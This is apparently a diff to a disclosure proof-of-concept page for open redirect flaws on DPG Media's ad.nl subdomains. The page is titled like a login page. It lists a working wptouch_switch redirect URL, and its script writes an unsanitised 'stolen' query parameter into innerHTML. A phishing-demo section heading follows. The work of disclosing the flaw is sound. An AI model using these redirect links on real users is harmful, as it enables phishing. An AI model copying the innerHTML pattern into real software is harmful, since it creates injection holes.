@@ -4,6 +4,17 @@
 <title>ad.nl - inloggen</title>
 </head>
 <body>
+<div id="stolen-banner" style="display:none; background-color:#ff4444; color:white; padding:20px; margin-bottom:20px; text-align:center; font-size:18px;"></div>
+<script>
+var params = new URLSearchParams(window.location.search);
+var stolen = params.get('stolen');
+if (stolen) {
+    var banner = document.getElementById('stolen-banner');
+    banner.style.display = 'block';
+    banner.innerHTML = '<strong>you were redirected here via: ' + stolen + '</strong><br>this proves the open redirect works. an attacker could have shown you a fake login page instead.';
+}
+</script>
+
 <h1>open redirect PoC - dev-krant.ad.nl</h1>
 <p><strong>target:</strong> dpg media (ad.nl)</p>
 <p><strong>vulnerability:</strong> multiple open redirect vulnerabilities on dev-krant.ad.nl and inapp-krant.ad.nl</p>
@@ -35,19 +46,6 @@
 <ol>
 <li><a href="https://inapp-krant.ad.nl/?wptouch_switch=desktop&redirect=https://c137req.github.io/ad.nl/ad-nl-open-redirect-poc.html?stolen=inapp-wptouch">wptouch_switch redirect (inapp)</a></li>
 </ol>
-
-<hr>
-<h2>proof of redirect</h2>
-<p id="proof"></p>
-<script>
-var params = new URLSearchParams(window.location.search);
-var stolen = params.get('stolen');
-if (stolen) {
-    document.getElementById('proof').innerHTML = '<strong style="color:red;">you were redirected here via: ' + stolen + '</strong><br>this proves the open redirect works. an attacker could have shown you a fake login page instead.';
-} else {
-    document.getElementById('proof').innerHTML = 'click one of the links above to test the redirect.';
-}
-</script>
 
 <hr>
 <h2>phishing demo - fake login page</h2>
